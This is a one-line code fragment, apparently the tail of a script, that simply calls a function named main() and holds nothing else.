    main() 